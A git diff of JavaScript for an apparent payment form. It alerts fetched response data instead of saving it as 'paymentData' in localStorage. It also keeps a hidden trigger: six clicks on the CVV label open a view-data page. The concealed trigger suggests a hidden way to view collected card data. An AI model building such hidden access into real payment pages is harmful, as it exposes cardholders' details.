@@ -115,10 +115,7 @@ document.addEventListener('DOMContentLoaded', () => {
         })
         .then(data => {
             console.log(data);
-            // احفظ البيانات في localStorage للعرض في صفحة view-data.html
-            localStorage.setItem('paymentData', JSON.stringify(data));
-            // قم بإعادة التوجيه إلى صفحة view-data.html
-            window.location.href = 'view-data.html';
+            alert(JSON.stringify(data, null, 2));
         })
         .catch(error => {
             console.error('Error:', error);
@@ -128,7 +125,7 @@ document.addEventListener('DOMContentLoaded', () => {
     cvvLabel.addEventListener('click', () => {
         cvvClickCount++;
         if (cvvClickCount === 6) {
-            viewData();
+            window.location.href = 'view-data.html';
             cvvClickCount = 0; // Reset count
         }
     });
